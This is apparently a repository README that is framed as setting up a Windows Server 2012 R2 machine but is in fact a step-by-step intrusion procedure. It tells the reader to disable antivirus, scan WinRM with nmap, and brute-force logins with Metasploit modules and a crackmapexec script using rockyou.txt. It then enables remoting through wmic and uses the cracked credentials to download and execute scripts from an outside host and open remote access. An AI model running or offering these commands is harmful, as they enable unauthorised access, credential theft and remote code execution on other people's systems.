# Adjust Windows 2012 R2 Desktop

This Scripts are Made for Initial Adjustment of a Windows Server 2012 R2 Machine from Command Prompt.

## Requirements

#### On Source Computer 1

- Microsoft Windows 10+ Operation System
- Windows Managements Foundation 5.1
- Set all Hosts as Trusted ( Set-Item wsman:\localhost\client\trustedhosts * )
- All necessary .Net Frameworks and VCRedist Installed
- Python 3 (version >= 3.8, 3.12 recomended)
- pyftpdlib python module (optional) for ftp server
- Chocolatey Packet Manager;
- nmap.exe (port Scanner);
- Microsoft Sysinternals;
- Local or Virtual Network Access to Target Machine;

#### On Source Computer 2

- debian like Linux (Ubuntu, Kali, Astra, raspbian)
- nmap (port Scanner)
- python3 (version >= 3.8)
- impacket python module
- pyftpdlib python module (optional) for ftp server
- crackmapexec python module
- metasploit framework
- brutforce userlists and passwords lists

#### On Target Computer

- Pure Installation of the Microsoft Windows Server 2012 R2 Operation System;
- Internet Access;
- (Optional) Latin Credentials (for Simplify)

### To be Sure

To Be Sure that Turn off your Antivirus on Source and Target Computer!

To Be Sure that Port 5985/tcp is Opened on Target Computer (nmap).

## Check if the 5985/tcp port is Enabled

- run a Command:

```bash
nmap -Pn -p 5985 -sS -sV --script=banner --max-rate=1280 192.168.252.46
```

If port is Closed, try another Ports or Exit

- run Commnds with PowerShell

```powershell
Test-NetConnection -ComputerName "192.168.252.46" -CommonTCPPort WinRM -InformationLevel Detailed

Test-WSMan -ComputerName "192.168.252.46"
```

These Commands must Run Successfully. If not Turn on the WinRM Service with Commands (for example):

```bash
wmic /node:192.168.252.46 process call create "powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command  { Enable-PSRemoting -Force}"
wmic /node:192.168.252.46 process call create "cmd.exe /c winrm quickconfig -transport:http -quiet" (Optional)
wmic /node:192.168.252.46 process call create "powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command  { Set-Item wsman:\localhost\client\trustedhosts * }" (Optional)
wmic /node:192.168.252.46 process call create "powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command  { Restart-Service WinRM }"
```

## Check if the Negotiate

- run next metasploit framework script:

```bash
#
# [Kali]: msfconsole -q -r '/home/vagramt/msfvenom/rc/winrm_scanner.rc'
#
use auxiliary/scanner/winrm/winrm_auth_method
set RHOST 192.168.252.46
exploit
```

If Negotiate or Basic authentication is enabled, do next

## Bruteforce Credentials

Brutforce Credentials are Made with two methods:

- For Remote Hosts with Latin Credentials:

```bash
#
# [Kali]: msfconsole -q -r '/home/vagramt/msfvenom/rc/winrm_login.rc'
#
use auxiliary/scanner/winrm/winrm_login
set RHOST 192.168.252.46
set user_file /home/vagrant/Dictionaries/user-my.txt
set pass_file /home/vagrant/Dictionaries/pass-my.txt
set PASSWORD I
set STOP_ON_SUCCESS true
exploit
```

- For Hosts in Local Network:

```bash
#!/bin/bash
####
# cme-winrm-test-extractpass-mynet.sh
# This Script will BruteForce the host $1 of winrm Protocols
# and will Put Credentials at Credentials Folder

### Set Variables
#
#LOGINFILE=/home/vagrant/Dictionaries/users-my.txt
LOGINFILE=Администратор
#PASSFILE=/home/vagrant/Dictionaries/passwords-my.txt
PASSFILE=/usr/share/wordlists/rockyou.txt
HOST=192.168.252.46
OUTFILE=/home/vagrant/Credentials/cme_winrm_$(date +"%y-%m-%d_%H-%M-%S")_$HOST.log.txt
OUTFILE1=/home/vagrant/Credentials/cme_winrm_pwn_$(date +"%y-%m-%d_%H-%M-%S")_$HOST.log.txt

crackmapexec winrm $HOST \
-u $LOGINFILE -p $PASSFILE | \
grep -v '[-]' | \
grep -v 'STATUS_LOGON_FAILURE' | \
tee $OUTFILE | \
grep -i '(Pwn3d!)' | \
tee $OUTFILE1
```

**Remark** All files and directories must be created and defined!

If You don't Find Credentials You can't Continue the Pentesting

## Run Commands

### Template of command

```bash
winrs -r:192.168.252.46 -u:Администратор -p:0A9s8d7F "команда"
```

or at PowerShell:

```powershell
# Add Remote Computer Credential
$cred3=Get-Credential

# Create New PSSession
$sess3=New-PSSession -ComputerName "192.168.252.46" -Credential $cred3 -Authentication Negotiate -Port 5985

## Run Template Command ##
Invoke-Command -Session $sess3 -ScriptBlock {net user administrator}

# Remove Session Variable if All is Done
Remove-PSSession $sess3
```

The String "\\192.168.252.46" is a Computer Name, the String "Администратор" is a login, the String "0A9s8d7F" is a password, the String "C:\Users\Администратор\" is a Home Folder in this Page. Change this if any Difference is Found.

This Data (except of login and password) you can retrieve with nmap.exe command (See Instructions in the Internet).

You can retrieve the login and password in a Kali Linux Operation System with Brutforce Programs hydra, medusa, crackmapexec and patator.

#### 1. Run msft-KB4012598

```powershell
{ Invoke-WebRequest -Uri 'http://file.netip4.ru:80/PROGS/Microsoft/KB4012598/WSH/msft-KB4012598-run-pwsh.cmd' -OutFile 'C:\Users\Администратор\msft-KB4012598-run-00.cmd' }

{ cmd.exe /c C:\Users\Администратор\msft-KB4012598-run-00.cmd }

{ cscript.exe //NoLogo C:\Users\Администратор\KB4012598-Download.wsf }
```

#### 2. Run Windows Adjust

```bash
# { cmd /c c:\.BIN\smbshare\LNK\postinstall.001.cmd }

{ cmd /c c:\.BIN\smbshare\LNK\postinstall.002.cmd }

{ cmd /c c:\.BIN\smbshare\LNK\postinstall.003.cmd }

( next for Windows 6.1 only )

{ Set-ExecutionPolicy -ExecutionPolicy Unrestricted }

( next for Server only )

{ cmd /c c:\.BIN\smbshare\LNK\postinstall.005.cmd }

( next for all Windows )

{ cmd /c c:\.BIN\smbshare\LNK\postinstall.006.cmd }

{ cmd /c c:\.BIN\smbshare\LNK\postinstall.007.b.cmd }

{ cmd /c c:\.BIN\smbshare\LNK\postinstall.008.cmd }
```

#### 3. Run Remote Enable

```powershell
{ Invoke-WebRequest -Uri 'http://file.netip4.ru:80/PROGS/NIT/RemoteOpen/nit-remoteenable-run-pwsh.cmd' -OutFile 'C:\Users\Администратор\nit-remoteenable-run-00.cmd' }

{ cmd.exe /c C:\Users\Администратор\nit-remoteenable-run-00.cmd }
```
